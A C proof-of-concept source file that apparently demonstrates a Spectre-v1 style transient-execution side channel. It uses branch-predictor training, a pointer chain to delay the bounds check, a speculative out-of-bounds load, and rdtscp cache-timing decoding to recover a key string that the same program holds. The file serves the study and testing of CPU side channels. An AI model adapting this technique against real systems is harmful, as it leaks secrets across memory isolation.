#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <x86intrin.h>

#define THRESHHOLD 80
#define TRAIN_NUM 20

#define NOP "nop;"
#define NOP1 NOP
#define NOP2 NOP1 NOP1
#define NOP4 NOP2 NOP2
#define NOP8 NOP4 NOP4
#define NOP16 NOP8 NOP8
#define NOP32 NOP16 NOP16
#define NOP64 NOP32 NOP32
#define NOP128 NOP64 NOP64
#define NOP256 NOP128 NOP128
#define NOP512 NOP256 NOP256
#define NOP1024 NOP512 NOP512
#define NOP2048 NOP1024 NOP1024

/* default: 64B line size, L1-D 64KB assoc 8, L1-I 32KB assoc 4, L2 2MB assoc 16 */
#define LLC_SIZE (4 << 20)
uint8_t dummy[LLC_SIZE];

uint8_t array1[200] = {0};
int array_size = 200;

size_t *ptr1;
size_t **ptr2;
size_t ***ptr3;
size_t ****ptr4;
size_t *****ptr5;

#define POINTER_CHASING(val) \
	{                        \
		ptr1 = &(val);       \
		ptr2 = &ptr1;        \
		ptr3 = &ptr2;        \
		ptr4 = &ptr3;        \
		ptr5 = &ptr4;        \
	}

int str_num;
char key_str[20];
char guess_str[20];

uint8_t array2[257 * 64] __attribute__((aligned(64)));

uint8_t foo(uint8_t *addr) {
    uint8_t res = *addr;
    asm(NOP256);
    return res;
}

uint8_t speculative(uint8_t *addr) {
    uint8_t res = *addr;
    res &= array2[res * 64];
    asm(NOP256);
    return res;
}

uint8_t encode(size_t *****ptr5_idx, uint8_t *secret) {
	size_t idx = *****ptr5_idx;
	if (idx < array_size) {
		return speculative(secret);
	} else {
		return foo(secret);
	}
}

void train_bpu(int num) {
    size_t index = 50;
	uint8_t tmp = 0;
	for (int i = 0; i < num; i++) {
		POINTER_CHASING(index);
		encode(ptr5, &tmp);
	}
}

uint8_t decode() {	
	unsigned long time1, time2;
	uint8_t tmp, res;
	int i;

	for (i = 0; i < 256; i++) {
		unsigned int junk;
		_mm_mfence();
		time1 = __rdtscp(&junk);
		_mm_lfence();
		tmp ^= array2[i * 64];
		time2 = __rdtscp(&junk);
		_mm_lfence();
		if (time2 - time1 < THRESHHOLD) {
			res = (uint8_t)i;
		}
	}

	return res;
}

uint8_t count_result(uint8_t results[], int begin, int end) {
    int count[256] = {0}, max = 0, i = begin;
	uint8_t tmp, max_ch = 0;
    for (; i < end; i++) {
		tmp = results[i];
		if ((++count[tmp]) > max) {
			max = count[tmp];
			max_ch = tmp;
		}
	}
	return max_ch;
}

int main(int argc, char **argv) {
	if (argc < 3) {
        perror("ERROR: You must input two arguments as [sample_number] [key string]!\n");
        exit(-1);
    }

    int sample_num, i, j;
    sample_num = atoi(argv[1]);

    str_num = strlen(argv[2]);
    if (str_num >= 20) {
        perror("ERROR: The length of sending key string must be smaller than 20!\n");
        exit(-1);
    }

	printf("!!!!!! array2[0] addr is 0x%lx\n", &(array2[0]));

	strncpy(key_str, argv[2], str_num);
	printf("======> 1. Save the sending key string: %s\n", key_str);
	printf("======> 2. Transmit the key string via dcache channel: \n");
	uint8_t *sample_results = malloc(sizeof(uint8_t) * sample_num);
	for (i = 0; i < str_num; i++) {
		size_t attack_idx = (int)(&(key_str[i]) - (char*)&array1);
		printf("Character-%d: %d -> ", i, (int)(key_str[i]));
        for (j = 0; j < sample_num; j++) {
			train_bpu(TRAIN_NUM);
			POINTER_CHASING(attack_idx);
			encode(ptr5, &(key_str[i]));
			asm(NOP128);
			asm("cpuid;" ::
					: "eax", "ebx", "ecx", "edx");
			sample_results[j] = decode();
			printf("%d ", (int)(sample_results[j]));
			memset(dummy, 1, sizeof(dummy));
		}
		guess_str[i] = (char)count_result(sample_results, 0, sample_num);
		printf("= %d\n", guess_str[i]);
	}

	printf("The guessed key string is: %s\n", guess_str);

	return 0;
}
